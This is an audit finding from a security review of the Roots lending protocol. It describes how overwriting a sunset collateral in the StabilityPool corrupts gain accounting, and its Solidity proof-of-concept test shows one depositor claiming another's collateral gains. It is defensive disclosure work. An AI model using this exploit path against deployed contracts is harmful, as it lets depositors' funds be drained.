---
tags:
  - lang/solidity
  - sector/cdp
  - sector/lending
  - sector/token
  - has/github
  - has/poc
  - severity/high
protocol: "[[Roots]]"
auditors:
  - Pashov Audit Group
report: "https://github.com/pashov/audits/blob/master/team/md/Roots-security-review_2025-02-09.md"
genome:
  - "[[integer-bounds]]"
  - "[[underflow]]"
  - "[[known-pattern]]"
  - "[[math-is-safe]]"
  - "[[fix-arithmetic]]"
---
# [H-01] Overwriting collateral breaks collateral gains logic

- id: 55111
- impact: HIGH
- protocol: Roots_2025-02-09
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Roots-security-review_2025-02-09.md

## Summary


This bug report describes a problem in the `StabilityPool` contract where enabling a new collateral after 180 days of the sunset of a previous collateral leads to incorrect collateral gains calculations. This can cause various issues such as denial of service attacks, inability to claim collateral gains, and users receiving more gains than they should. A proof of concept is provided to demonstrate the issue. The report recommends avoiding overwriting sunset collaterals and creating a new function to disable them after the expiration time has passed.

## Details

## Severity

**Impact:** High

**Likelihood:** Medium

## Description

In the `StabilityPool` contract, when 180 days have passed since the sunset of a collateral, enabling a new collateral overwrites the previous one.

In this process, the `epochToScaleToSums` mapping is cleared, but not the `collateralGainsByDepositor` and `depositSums` mappings. This means that the pending gains for the old collateral will be counted as gains for the new collateral.

As a result, the collateral gains logic is broken, leading to different situations, such as:

- DoS on functions that execute `_accrueDepositorCollateralGain` due to underflow on `uint256 firstPortion = sums[i] - depSums[i];`.
- Users being unable to claim their collateral gains because there is not enough collateral in the pool.
- Users claiming more gains than they should, taking them from other users (see proof of concept).

Additionally, the current overwriting system requires that a new collateral is enabled in order to disable the sunset collateral, which is not ideal.

## Proof of concept

Add the following code to the file `test/unit/Roots.t.sol` and run `forge test --mt test_sunsetCollateral`.

```solidity
function _openTroveAndProvideToSP(
    TroveManager troveManager,
    address user,
    uint256 collAmount,
    uint256 debtAmount
) private {
    Collateral collateral = Collateral(address(troveManager.collateralToken()));
    vm.startPrank(user);
    collateral.mint(collAmount);
    collateral.approve(address(system.borrowerOperations), collAmount);
    system.borrowerOperations.openTrove(troveManager, user, 1e16, collAmount, debtAmount, address(0), address(0));
    system.debtToken.approve(address(system.stabilityPool), debtAmount);
    system.stabilityPool.provideToSP(debtAmount);
    vm.stopPrank();
}

function test_sunsetCollateral() external {
    uint256 collateralToProvide = 4e18;
    uint256 amountToBorrow = 1e18;

    // Alice opens trove with coll A and provides MEAR to stability pool
    _openTroveAndProvideToSP(troveManagerA, ALICE, collateralToProvide * 100, amountToBorrow);

    // Bob opens trove with coll A and provides MEAR to stability pool
    _openTroveAndProvideToSP(troveManagerA, BOB, collateralToProvide, amountToBorrow);

    // Bob becomes liquidable and is liquidated
    uint256 newCollateralPrice = (12e17 * amountToBorrow) / collateralToProvide;
    priceFeed.setPrice(address(collateralA), newCollateralPrice);
    vm.prank(LIQUIDATOR);
    system.liquidationManager.liquidate(troveManagerA, BOB);

    // Alice triggers accrual of collateral gains
    skip(1);
    vm.prank(ALICE);
    system.stabilityPool.withdrawFromSP(0);

    // Collateral A is sunset
    vm.startPrank(OWNER);
    troveManagerA.startSunset();
    system.stabilityPool.startCollateralSunset(collateralA);
    vm.stopPrank();

    // After 180 days, a new collateral is added
    skip(180 days + 1);
    Collateral collateralC = new Collateral("Collateral C", "CC");
    priceFeed.setPrice(address(collateralC), 2e18);

    vm.prank(OWNER);
    system.factory.deployNewInstance(
        address(collateralC),
        address(priceFeed),
        address(0),
        address(0),
        address(0),
        abi.encodeWithSelector(
            TroveManager.setParameters.selector,
            minuteDecayFactor,
            redemptionFeeFloor,
            maxRedemptionFee,
            borrowingFeeFloor,
            maxBorrowingFee,
            interestRateInBps,
            maxDebt,
            MCR
        ),
        bytes("")
    );
    TroveManager troveManagerC = TroveManager(system.factory.troveManagers(2));

    // Alice opens trove with coll C and provides MEAR to stability pool
    _openTroveAndProvideToSP(troveManagerC, ALICE, collateralToProvide * 100, amountToBorrow);

    // Bob opens trove with coll C and provides MEAR to stability pool
    _openTroveAndProvideToSP(troveManagerC, BOB, collateralToProvide, amountToBorrow);

    // Bob becomes liquidable and is liquidated
    priceFeed.setPrice(address(collateralC), newCollateralPrice);
    vm.prank(LIQUIDATOR);
    system.liquidationManager.liquidate(troveManagerC, BOB);

    // Alice claims gains for coll C, receiving also the amount corresponding to coll A
    uint256[] memory collateralIndexes = new uint256[](1);
    collateralIndexes[0] = 0;
    vm.prank(ALICE);
    system.stabilityPool.claimCollateralGains(ALICE, collateralIndexes);

    // Bob tries to claim gains for coll C, but his gains have been sent to Alice
    vm.prank(BOB);
    vm.expectRevert("ERC20: transfer amount exceeds balance");
    system.stabilityPool.claimCollateralGains(BOB, collateralIndexes);
}
```

## Recommendations

Avoid overwriting sunset collaterals and create a new function to disable them after the `expiry` time has been reached.
